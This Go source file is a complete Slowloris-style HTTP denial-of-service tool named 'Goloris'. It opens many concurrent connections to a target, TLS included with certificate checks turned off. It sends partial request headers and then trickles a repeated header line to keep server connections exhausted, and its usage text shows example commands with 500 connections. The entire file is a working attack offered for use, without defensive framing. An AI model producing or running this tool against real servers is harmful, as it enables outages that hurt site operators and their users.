package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"net"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"time"
)

const (
	defaultUserAgent = "Goloris HTTP DoS"
	defaultDOSHeader = "Cookie: a=b"
)

var (
	numConnections int
	interval       int
	timeout        int
	method         string
	resource       string
	userAgent      string
	target         string
	https          bool
	dosHeader      string
)

func main() {
	parseParams()
	if len(flag.Args()) == 0 {
		usage()
		os.Exit(-1)
	}

	signals := make(chan os.Signal, 1)
	signal.Notify(signals, os.Interrupt, os.Kill)

	target = flag.Args()[0]
	if !strings.Contains(target, ":") {
		if https {
			target += ":443"
		} else {
			target += ":80"
		}
	}

	openConnections(target, numConnections, timeout, https)

loop:
	for {
		select {
		case <-signals:
			fmt.Printf("Received SIGKILL, exiting...\n")
			break loop
		}
	}
}

func parseParams() {
	flag.IntVar(&numConnections, "connections", 10, "Number of active concurrent connections")
	flag.IntVar(&interval, "interval", 1, "Number of seconds to wait between sending headers")
	flag.IntVar(&timeout, "timeout", 60, "HTTP connection timeout in seconds")
	flag.StringVar(&method, "method", "GET", "HTTP method to use")
	flag.StringVar(&resource, "resource", "/", "Resource to request from the server")
	flag.StringVar(&userAgent, "useragent", defaultUserAgent, "User-Agent header of the request")
	flag.StringVar(&dosHeader, "dosHeader", defaultDOSHeader, "Header to send repeatedly")
	flag.BoolVar(&https, "https", false, "Use HTTPS")
	flag.Parse()
}

func usage() {
	fmt.Println("")
	fmt.Println("usage: goloris [OPTIONS]... TARGET")
	fmt.Println("  TARGET host:port. port 80 is assumed for HTTP connections. 443 is assumed for HTTPS connections")
	fmt.Println("")
	fmt.Println("OPTIONS")
	flag.PrintDefaults()
	fmt.Println("")
	fmt.Println("EXAMPLES")
	fmt.Printf("  %s -connections=500 192.168.0.1\n", os.Args[0])
	fmt.Printf("  %s -https -connections=500 192.168.0.1\n", os.Args[0])
	fmt.Printf("  %s -useragent=\"some user-agent string\" -https -connections=500 192.168.0.1\n", os.Args[0])
	fmt.Println("")
}

func openConnections(target string, num, timeout int, https bool) {
	for i := 0; i < num; i++ {
		go slowloris(target, interval, timeout, https)
	}
}

func slowloris(target string, interval, timeout int, https bool) {
	timeoutDuration := time.Duration(timeout) * time.Second

loop:
	for {
		var conn net.Conn
		var err error

		if https {
			config := &tls.Config{InsecureSkipVerify: true}
			conn, err = tls.Dial("tcp", target, config)
			if err != nil {
				continue
			}
			defer conn.Close()
		} else {
			conn, err = net.DialTimeout("tcp", target, timeoutDuration)
			if err != nil {
				continue
			}
			defer conn.Close()
		}

		headers := makeHeaders(target)
		req, err := createRequest(target, method, resource, headers)
		if err != nil {
			fmt.Println(err.Error())
			continue
		}
		req.Header.Write(conn)

		for {
			select {
			case <-time.After(time.Duration(interval) * time.Second):
				_, err := conn.Write([]byte(dosHeader + "\r\n"))
				if err != nil {
					continue loop
				}
			}
		}
	}

}

func createRequest(host, method, resource string, headers map[string]string) (*http.Request, error) {
	req, err := http.NewRequest(method, host, nil)
	if err != nil {
		return nil, err
	}

	for header, value := range headers {
		req.Header.Add(header, value)
	}

	return req, nil
}

func makeHeaders(host string) map[string]string {
	headers := make(map[string]string)

	headers["Host"] = host
	headers["User-Agent"] = defaultUserAgent
	headers["Content-Length"] = "42"

	return headers
}
